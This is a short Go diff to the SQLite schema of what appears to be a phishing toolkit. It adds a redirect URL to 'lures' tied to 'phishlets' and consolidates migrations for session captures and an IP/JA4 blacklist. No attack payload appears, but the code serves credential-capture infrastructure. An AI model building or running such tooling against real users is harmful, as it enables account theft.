@@ -16,7 +16,7 @@ CREATE TABLE IF NOT EXISTS sessions (id TEXT PRIMARY KEY, phishlet_id TEXT NOT N
 CREATE TABLE IF NOT EXISTS captures (id TEXT PRIMARY KEY, session_id TEXT NOT NULL, kind TEXT NOT NULL, created_at INTEGER NOT NULL);
 CREATE TABLE IF NOT EXISTS blacklist (ip_or_ja4 TEXT PRIMARY KEY, reason TEXT NOT NULL);
 CREATE TABLE IF NOT EXISTS domain_presets (domain TEXT PRIMARY KEY, created_at INTEGER NOT NULL);
-CREATE TABLE IF NOT EXISTS smart_lures (path TEXT PRIMARY KEY, phishlet_id TEXT NOT NULL, expires_at INTEGER DEFAULT 0, max_uses INTEGER DEFAULT 0, uses INTEGER DEFAULT 0, bound_ip TEXT DEFAULT '', require_challenge INTEGER DEFAULT 0);
+CREATE TABLE IF NOT EXISTS smart_lures (path TEXT PRIMARY KEY, phishlet_id TEXT NOT NULL, expires_at INTEGER DEFAULT 0, max_uses INTEGER DEFAULT 0, uses INTEGER DEFAULT 0, bound_ip TEXT DEFAULT '', require_challenge INTEGER DEFAULT 0, redirect_url TEXT DEFAULT '');
 `
 
 type DB struct{ sql *sql.DB }
@@ -30,11 +30,14 @@ func Open(path string) (*DB, error) {
 		d.Close()
 		return nil, fmt.Errorf("migrate: %w", err)
 	}
-	// Миграция старых баз: captures.node (идемпотентно).
-	if _, err := d.Exec(`ALTER TABLE captures ADD COLUMN node TEXT DEFAULT ''`); err != nil {
-		if !isDupColumn(err) {
+	// Миграции старых баз (идемпотентно).
+	for _, stmt := range []string{
+		`ALTER TABLE captures ADD COLUMN node TEXT DEFAULT ''`,
+		`ALTER TABLE smart_lures ADD COLUMN redirect_url TEXT DEFAULT ''`,
+	} {
+		if _, err := d.Exec(stmt); err != nil && !isDupColumn(err) {
 			d.Close()
-			return nil, fmt.Errorf("migrate node: %w", err)
+			return nil, fmt.Errorf("migrate: %w", err)
 		}
 	}
 	return &DB{sql: d}, nil
